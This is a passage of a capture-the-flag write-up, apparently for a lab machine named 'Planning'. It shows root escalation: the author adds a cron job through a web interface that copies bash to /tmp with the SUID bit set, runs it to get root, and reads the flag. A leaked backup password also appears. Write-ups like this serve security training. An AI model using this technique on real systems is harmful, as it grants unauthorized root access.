![Cronjobs](/assets/images/2025/08/Planning/Cronjobs.png "Cronjobs")

I got a web application that displayed the crons I found on the server. I used the application to create a new cron job that would copy bash and set the `suid` bit on it. I added a call to `sleep`, to make sure that the cleanup script would not delete the bash copy before I could use it.

![Create cronjob](/assets/images/2025/08/Planning/CreateCronjob.png "Create cronjob")

```bash
enzo@planning:/opt/crontabs$ cat crontab.db | jq .
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
{
  "name": "Test",
  "command": "sleep 5; cp /bin/bash /tmp ; chmod +s /tmp/bash",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Jul 26 2025 20:31:12 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1753561872086,
  "saved": false,
  "_id": "kfeIXWKZSat534II"
}
```

I waited for the crons to run. Once it ran, `/tmp` had a bash file owned by root, with the `suid` bit set.

```bash
enzo@planning:/opt/crontabs$ ls -ltr /tmp/
total 1456

...

drwx------ 2 enzo enzo    4096 Jul 26 20:20 tmux-1000
-rw-r--r-- 1 root root       0 Jul 26 20:28 YvZsUUfEXayH6lLj.stderr
-rw-r--r-- 1 root root       0 Jul 26 20:28 YvZsUUfEXayH6lLj.stdout
-rw-r--r-- 1 root root     659 Jul 26 20:28 crontab
-rw-r--r-- 1 root root       0 Jul 26 20:29 gNIRXh1WIc9K7BYX.stderr
-rw-r--r-- 1 root root       0 Jul 26 20:29 gNIRXh1WIc9K7BYX.stdout
-rw-r--r-- 1 root root       0 Jul 26 20:29 g6lxU2oNfLw2945x.stderr
-rw-r--r-- 1 root root       0 Jul 26 20:29 g6lxU2oNfLw2945x.stdout
-rwsr-sr-x 1 root root 1446024 Jul 26 20:29 bash
```

I ran it to become root, then read the root flag.

```bash
enzo@planning:/opt/crontabs$ /tmp/bash -p

bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) egid=0(root) groups=0(root),1000(enzo)

bash-5.2# cat /root/root.txt
4278a98a97085af1f3e927613653a2c2
```